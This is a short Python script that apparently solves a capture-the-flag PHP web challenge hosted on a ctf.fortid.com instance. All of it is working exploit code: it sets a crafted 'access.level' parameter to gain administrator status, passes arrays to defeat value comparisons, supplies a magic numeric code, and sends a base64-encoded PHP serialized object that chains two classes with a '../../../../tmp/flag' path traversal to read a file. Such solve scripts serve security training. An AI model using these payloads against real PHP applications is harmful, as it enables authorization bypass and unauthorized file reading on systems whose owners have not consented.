import requests
import base64
url = "https://ultimative-php-116b8f128bb2.inst13.ctf.fortid.com"
s = requests.Session()

params = {}
#Chall 1
params['access.level'] = 'administrator'
#Chall 2
params['primary[]'] = '2'
params['backup[]'] = '1'
#Chall 3
params['code'] = "9302110163913021"
#Chall 4
payload = """O:15:"MigratedProfile":1:{s:11:"displayName";O:14:"LegacyTemplate":1:{s:8:"template";s:20:"../../../../tmp/flag";}}"""
print(payload)

params['profile'] = base64.b64encode(payload.encode('utf-8')).decode('utf-8')

r = s.get(url, params=params)

print(r.text)